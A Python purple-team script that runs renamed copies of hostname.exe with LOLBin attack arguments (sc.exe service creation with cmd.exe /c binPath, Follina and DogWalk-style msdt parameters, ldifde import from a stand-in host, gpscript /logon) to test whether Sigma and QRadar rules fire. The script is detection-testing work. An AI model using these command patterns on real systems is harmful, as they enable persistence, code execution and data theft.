#!/usr/bin/env python3
r"""
LOLBin Masquerading Tester -- Final 6 (Sigma + QRadar matched)
================================================================
Scope: Msconfig.exe, OneDriveStandaloneUpdater.exe, Sc.exe,
       Ldifde.exe, Msdt.exe, Gpscript.exe (your "Gscript" rule)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
GSCRIPT CLARIFICATION (your rule: command contains "gscript"
AND command contains "/logon" or "/startup"):
  "Gscript" is not a standalone Windows binary. Your QRadar rule
  does a SUBSTRING MATCH on "gscript" inside the CommandLine field.
  The binary "gpscript.exe" satisfies this because the string
  "gscript" is a substring of "gpscript". That is exactly how
  attackers abuse it. This script uses the filename gpscript.exe
  in ALL LOWERCASE as the primary casing so the command line
  literally contains "gscript" -- satisfying a case-sensitive
  OR case-insensitive QRadar comparison. Sigma rule verified:
  proc_creation_win_lolbin_gpscript.yml
  (CommandLine|contains: ' /logon' OR ' /startup')

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SIGMA SOURCES (verified from SigmaHQ master, Sep 2026):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Msconfig.exe    proc_creation_win_uac_bypass_msconfig_gui.yml
  Only public Sigma process_creation rule requires:
    IntegrityLevel=High AND ParentImage=...\AppData\Local\Temp\pkgmgr.exe
    AND CommandLine='"C:\Windows\system32\msconfig.exe" -5'
  This is a UAC bypass context that cannot be safely replicated.
  The -5 argument string IS included so your QRadar rule matches
  if it checks that arg. Also tries name-only (process name match).

OneDriveStandaloneUpdater.exe
  registry_set_lolbin_onedrivestandaloneupdater.yml (REGISTRY SET,
  not process_creation). The Sigma rule fires on a registry write to
  UpdateRingSettingURLFromOC -- not on the process itself. No public
  Sigma process_creation rule exists for this binary. Process-name-only
  attempt included. Share your QRadar rule text to improve.

Sc.exe          proc_creation_win_susp_service_creation.yml (verified master)
  Image|endswith: '\sc.exe'
  CommandLine|contains|all: ['create', 'binPath=']
  AND CommandLine|contains one of suspicious strings:
    'powershell', 'mshta', 'wscript', 'cscript', 'svchost',
    'dllhost', 'cmd ', 'cmd.exe /c', 'rundll32',
    'C:\Users\Public', '\Downloads\', '\Desktop\',
    'C:\Windows\TEMP\', '\AppData\Local\Temp'
  work_dir IS in \AppData\Local\Temp\ so the absolute path to the
  decoy payload automatically satisfies the suspicious-path condition.
  Also includes the service-tampering variant (config + binPath=).

Ldifde.exe      proc_creation_win_ldifde_file_load.yml
  Image|endswith: '\ldifde.exe' OR OriginalFileName: 'ldifde.exe'
  CommandLine|contains|all: ['-i', '-f']

Msdt.exe        proc_creation_win_msdt_arbitrary_command_execution.yml
                proc_creation_win_msdt_susp_cab_options.yml
  CommandLine|contains 'IT_BrowseForFile=' (Follina/CVE-2022-30190)
  OR CommandLine|contains ' PCWDiagnostic' + '/id' + '/skip'
  OR CommandLine|contains '-cab'

Gpscript.exe    proc_creation_win_lolbin_gpscript.yml
  Image|endswith '\gpscript.exe' OR OriginalFileName: 'GPSCRIPT.EXE'
  CommandLine|contains ' /logon' OR ' /startup'
  NOT ParentCommandLine: 'C:\windows\system32\svchost.exe -k netsvcs -p -s gpsvc'

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SAFETY MODEL (unchanged throughout this series):
  All processes that execute are hash-verified copies of hostname.exe.
  Argument strings are recorded in the 4688 event at CreateProcess time
  before any code runs -- that is what QRadar reads. Nothing malicious
  ever executes. Cleanup is verified; stray folders are swept at startup.
  PID captured via Popen() not subprocess.run() (CompletedProcess has
  no .pid attribute -- that was the bug fixed several rounds ago).

REQUIREMENTS: Windows only.
"""

import hashlib
import json
import os
import platform
import shutil
import subprocess
import sys
import tempfile
import time
from datetime import datetime
from pathlib import Path

KEEP_RESULTS_LOG = True
CANARY_TAG = f"PURPLE-TEAM-TEST-{datetime.now().strftime('%Y%m%d%H%M%S')}"
SAFE_SOURCE_BINARY = r"C:\Windows\System32\hostname.exe"
DROP_ARTIFACT_FILES = True

LOLBIN_TEST_CASES = {
    "Msconfig.exe": {
        "sigma_rule": "proc_creation_win_uac_bypass_msconfig_gui.yml",
        "sigma_condition": (
            "UAC bypass context only: IntegrityLevel=High + pkgmgr.exe parent "
            "+ CommandLine='\"C:\\Windows\\system32\\msconfig.exe\" -5'. "
            "Cannot be replicated. Name-only + -5 arg attempted."
        ),
        "artifact": None,
        "args_variants": [
            # Process-name-only (covers rules that just check binary name)
            lambda wd: [],
            # -5 argument from the Sigma UAC bypass rule
            lambda wd: ["-5"],
        ],
    },
    "OneDriveStandaloneUpdater.exe": {
        "sigma_rule": "registry_set_lolbin_onedrivestandaloneupdater.yml (REGISTRY SET only)",
        "sigma_condition": (
            "NO process_creation Sigma rule exists. The only Sigma rule watches "
            "a registry write to UpdateRingSettingURLFromOC -- not the process itself. "
            "Process-name-only attempt. Share QRadar rule text to improve."
        ),
        "artifact": None,
        "args_variants": [
            # Process-name-only -- this is the only thing a process_creation rule
            # for this binary can realistically key on
            lambda wd: [],
        ],
    },
    "Sc.exe": {
        "sigma_rule": "proc_creation_win_susp_service_creation.yml (verified master Sep 2026)",
        "sigma_condition": (
            "sc.exe + CommandLine|contains|all ['create', 'binPath='] "
            "+ suspicious path string. work_dir in \\AppData\\Local\\Temp\\ "
            "satisfies the suspicious-path condition automatically."
        ),
        "artifact": "decoy_payload.exe",
        "args_variants": [
            # Primary: sc create with suspicious binPath in temp (Sigma-matched)
            lambda wd: ["create", "decoysvc",
                        "binPath=" + str(wd / "decoy_payload.exe")],
            # Tampering variant: modify existing service binPath
            lambda wd: ["config", "decoysvc",
                        "binPath=" + str(wd / "decoy_payload.exe")],
            # cmd.exe /c in the binPath explicitly satisfies another Sigma condition
            lambda wd: ["create", "decoysvc2",
                        "binPath=cmd.exe /c " + str(wd / "decoy_payload.exe")],
        ],
    },
    "Ldifde.exe": {
        "sigma_rule": "proc_creation_win_ldifde_file_load.yml",
        "sigma_condition": (
            "Image|endswith '\\ldifde.exe' OR OriginalFileName 'ldifde.exe' "
            "AND CommandLine|contains|all ['-i', '-f']"
        ),
        "artifact": "decoy_payload.ldf",
        "args_variants": [
            # Standard LDIF import (most common Sigma-matched pattern)
            lambda wd: ["-i", "-f", str(wd / "decoy_payload.ldf")],
            # HTTP-based LDIF import (attacker exfil/download variant)
            lambda wd: ["-i", "-f", "https://example.com/decoy.ldf",
                        "-s", "dc.example.com"],
            # Export variant (-f without -i) -- different abuse for data theft
            lambda wd: ["-f", str(wd / "decoy_export.ldf"),
                        "-d", "DC=example,DC=com"],
        ],
    },
    "Msdt.exe": {
        "sigma_rule": (
            "proc_creation_win_msdt_arbitrary_command_execution.yml, "
            "proc_creation_win_msdt_susp_cab_options.yml"
        ),
        "sigma_condition": (
            "IT_BrowseForFile= (Follina CVE-2022-30190) "
            "OR PCWDiagnostic + /id + /skip "
            "OR -cab flag"
        ),
        "artifact": "decoy_payload.exe",
        "args_variants": [
            # Follina / CVE-2022-30190 -- most well-known msdt abuse pattern
            lambda wd: ["/id", "PCWDiagnostic", "/skip", "force",
                        "/param",
                        "IT_BrowseForFile=" + str(wd / "decoy_payload.exe")],
            # ms-msdt URI handler approach
            lambda wd: ["ms-msdt:-id", "PCWDiagnostic",
                        "/skip", "force",
                        "/param",
                        "IT_BrowseForFile=" + str(wd / "decoy_payload.exe")],
            # Cabinet with embedded answer file (DogWalk/CVE-2022-34713 pattern)
            lambda wd: ["-cab", str(wd / "decoy_diagcab.cab")],
        ],
    },
    # ----------------------------------------------------------------
    # GSCRIPT: your QRadar rule = "command contains gscript"
    #          AND "command contains /logon or /startup"
    # The binary is gpscript.exe. The string "gscript" is a substring
    # of "gpscript". By naming the file gpscript.exe (lowercase), the
    # 4688 CommandLine will literally contain "gscript" as a substring,
    # satisfying both case-sensitive AND case-insensitive QRadar rules.
    # ----------------------------------------------------------------
    "gpscript.exe": {
        "sigma_rule": "proc_creation_win_lolbin_gpscript.yml",
        "sigma_condition": (
            "Image|endswith '\\gpscript.exe' OR OriginalFileName 'GPSCRIPT.EXE' "
            "AND CommandLine|contains ' /logon' OR ' /startup' "
            "NOT ParentCommandLine 'svchost.exe -k netsvcs -p -s gpsvc'"
        ),
        "artifact": None,
        "args_variants": [
            # /logon -- executes scripts assigned to logon Group Policy
            lambda wd: ["/logon"],
            # /startup -- executes scripts assigned to startup Group Policy
            lambda wd: ["/startup"],
        ],
    },
}


def sha256_of(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def sweep_stray_runs():
    removed = []
    for p in Path(tempfile.gettempdir()).glob("lolbin6fin_*"):
        if p.is_dir():
            shutil.rmtree(p, ignore_errors=True)
            if not p.exists():
                removed.append(str(p))
    return removed


def verified_cleanup(work_dir):
    shutil.rmtree(work_dir, ignore_errors=True)
    if not work_dir.exists():
        return True, []
    leftover = []
    for p in work_dir.rglob("*"):
        if p.is_file():
            try:
                p.unlink()
            except Exception:
                leftover.append(str(p))
    try:
        work_dir.rmdir()
    except Exception:
        pass
    return (not work_dir.exists()), leftover


def run_and_classify(cmd, timeout=15):
    """Popen gives us pid before process exits.
    subprocess.run() returns CompletedProcess which has no .pid -- that
    was the bug causing pid=None in every prior round."""
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE)
        pid = proc.pid
        try:
            proc.communicate(timeout=timeout)
            return f"exited on its own (rc={proc.returncode})", pid
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.communicate()
            return f"did not exit within {timeout}s -- killed", pid
    except OSError as e:
        if getattr(e, "winerror", None) == 5:
            return "BLOCKED (WinError 5 -- EDR/AV prevention fired)", None
        return f"launch error: {e}", None
    except Exception as e:
        return f"error: {e}", None


def casing_variants(name):
    """For gpscript.exe: we prioritise lowercase so the CommandLine contains
    the literal substring 'gscript' regardless of QRadar's case-sensitivity.
    For all others: lower, as-given, upper."""
    seen, out = set(), []
    for v in [name.lower(), name, name.upper()]:
        if v not in seen:
            seen.add(v)
            out.append(v)
    return out


def main():
    if platform.system() != "Windows":
        print("Windows only -- exiting without doing anything.")
        sys.exit(1)

    if not Path(SAFE_SOURCE_BINARY).exists():
        print(f"Cannot find {SAFE_SOURCE_BINARY} -- aborting.")
        sys.exit(1)

    source_hash = sha256_of(SAFE_SOURCE_BINARY)

    stray = sweep_stray_runs()
    if stray:
        print(f"Swept {len(stray)} leftover folder(s) from a previous run.\n")

    work_dir = Path(tempfile.mkdtemp(prefix="lolbin6fin_"))
    print("=" * 78)
    print("LOLBin Final-6 Tester -- Sigma-verified + QRadar-matched")
    print("=" * 78)
    print(f"Canary tag     : {CANARY_TAG}")
    print(f"hostname SHA256: {source_hash}")
    print(f"Working dir    : {work_dir}")
    print(f"  (in \\AppData\\Local\\Temp\\ -- satisfies Sc.exe suspicious-path condition)")
    print()

    log = []
    try:
        for canonical_name, cfg in LOLBIN_TEST_CASES.items():
            print(f"{'='*60}")
            print(f"[*] {canonical_name}")
            print(f"    Sigma       : {cfg['sigma_rule']}")
            print(f"    Condition   : {cfg['sigma_condition']}")
            print()

            if DROP_ARTIFACT_FILES and cfg["artifact"]:
                (work_dir / cfg["artifact"]).write_text(
                    f"PURPLE TEAM TEST ARTIFACT - NOT EXECUTABLE\n"
                    f"Canary: {CANARY_TAG}\n"
                )

            blocked_globally = False
            for case_name in casing_variants(canonical_name):
                if blocked_globally:
                    break
                decoy_path = work_dir / case_name
                shutil.copy2(SAFE_SOURCE_BINARY, decoy_path)
                if sha256_of(decoy_path) != source_hash:
                    print(f"    [{case_name}] hash mismatch -- ABORTED")
                    continue

                for i, args_fn in enumerate(cfg["args_variants"], start=1):
                    cmd = [str(decoy_path)] + args_fn(work_dir)
                    print(f"    [{case_name}] v{i}: {' '.join(cmd)}")
                    ts = datetime.now().isoformat()
                    status, pid = run_and_classify(cmd)
                    print(f"         -> {status}  pid={pid}")
                    log.append({
                        "canonical_name": canonical_name,
                        "cased_as": case_name,
                        "variant": i,
                        "timestamp": ts,
                        "command": " ".join(cmd),
                        "status": status,
                        "pid": pid,
                    })
                    time.sleep(0.75)
                    if "BLOCKED" in status:
                        blocked_globally = True
                        print("    EDR blocked -- skipping remaining variants/casings")
                        break
            print()
    finally:
        cleaned, leftover = verified_cleanup(work_dir)

    print("=" * 78)
    print(f"CLEANUP: {work_dir} removed = {cleaned}")
    if not cleaned:
        for f in leftover:
            print(f"  STUCK: {f}")
    print("=" * 78 + "\n")

    if KEEP_RESULTS_LOG:
        results_file = Path.cwd() / f"lolbin6fin_results_{CANARY_TAG}.json"
        with open(results_file, "w") as f:
            json.dump({"canary_tag": CANARY_TAG,
                       "hostname_sha256": source_hash,
                       "work_dir_cleaned": cleaned,
                       "results": log}, f, indent=2)
        print(f"Results saved: {results_file}")

    print(f"\nSearch QRadar for canary tag: {CANARY_TAG}")
    print(r"""
INTERPRETATION:

  gpscript.exe  -- lowercase is the primary casing tried FIRST. The
    command line ...\gpscript.exe /logon contains "gscript" as a
    substring AND contains "/logon". Both conditions of your QRadar
    rule are satisfied. If the lowercase variant fires but others
    don't, your rule is case-sensitive on "gscript". If none fire,
    check whether your QRadar rule checks CommandLine or ProcessName.

  Sc.exe  -- 3 variants: create+binPath (primary Sigma match),
    config+binPath (tampering variant), and cmd.exe /c in binPath
    (explicitly satisfies a separate Sigma OR condition). At least
    one should fire on any reasonable sc.exe rule. If none fire,
    share the exact QRadar conditions.

  Msconfig.exe  -- if neither name-only nor -5 fires, the QRadar rule
    almost certainly requires the UAC bypass context (High integrity +
    pkgmgr.exe parent), which cannot be replicated safely. Share the
    conditions to confirm.

  OneDriveStandaloneUpdater  -- if this doesn't fire, it's because
    your QRadar rule (if it exists) fires on the registry set event,
    not process creation. Confirm by looking at your rule's log source
    type -- if it's not Windows Security 4688, this approach can't
    trigger it via process masquerading.
""")


if __name__ == "__main__":
    main()
